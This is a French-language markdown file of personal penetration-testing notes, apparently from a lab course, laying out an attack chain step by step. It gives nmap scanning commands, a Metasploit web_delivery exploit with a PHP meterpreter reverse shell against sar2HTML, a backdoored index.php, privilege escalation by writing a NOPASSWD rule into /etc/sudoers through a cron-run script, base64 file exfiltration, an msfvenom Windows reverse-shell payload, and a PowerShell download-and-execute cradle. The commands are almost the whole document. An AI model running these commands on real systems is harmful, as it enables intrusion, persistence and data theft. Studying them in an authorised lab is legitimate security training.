July with JM.md


## Etapes de pentest:

1. Reconnaissance
2. Analyse de vulns
3. Exploit de vulns - initial accès
4. Post Exploit - Persistance d’accès - Mouvement latéraux - data exfiltration
6. Rapport


    nmap 10.0.0.0/24 -sn (1ere étape +discret donne les machines up)

    nmap 10.0.0.0/24 -p 22,21,23,135,80,443,3389,3306,445 -oX /tmp/a.xml -Pn --open (2eme étape vision sur les services)

    nmap 10.0.0.0/24 -p 80,443,8080,8443,3389,445 -sV --open -sC -T4 -A -oX /tmp/a.xml   (fingerprinting)

Dans metasploit:  db_import /tmp/a.xml
(services, hosts, vulns)



2. recherche de vulns

découverte http://nananana/robots.txt
on trouve http://10.0.0.103/sar2HTML/ > recherche google sar2HTMLvXXX

Exploitdb


- msf5 > use exploit/multi/script/web_delivery
- set lport 4444
- set lhost 192.168.0.18
- set uripath /rgpd/
- set target 1
- set payload php/meterpreter/reverse_tcp
- exploit

copier l'exploit dans la barre d'adresse du navigateur 
## Backdoor:
sessions 1 > meterpreter

ls
lcd /tmp
download index.php
modif de index
upload /tmp/index.php

curl http://192.168.0.13/sar2HTML/index.php?tata=id | head -n 1



changer le meterpreter en bash : python3 -c 'import pty;pty.spawn("/bin/bash")'



## élévation de droit:
- fichier /var/www/html/write.sh > download >  echo "www-data ALL= (root) NOPASSWD: /usr/bin/sudo " >>/etc/sudoers > upload
- shell > /etc/crontab > attendre 5 min
- sudo -u root sudo su

## exfiltration:

cat /tmp/a.txt |base64 > genere le base 64 du fichier > on c/c le b64
- recup windows_adrienne.rdp

# rdp Windows par payload

- forger malicious
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8080 LHOST=10.0.0.2 -f psh-net -o malicious.ps1
- demarrer le serveur SimpleHTTPS au même endroit
python -m SimpleHTTPServer 80

## dans metasploit:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp (> options :lhost, lport)

## powershell:
$e=new-object net.webclient;
IEX $e.downloadstring('http://xxx.xxx.xxx.xxx/malicious.ps1')

## Metasploit:
- passe le meterpreter en backgroung
meterpreter >background
msf5 exploit(multi/handler) > search suggest
use 3
options
set session 1
run


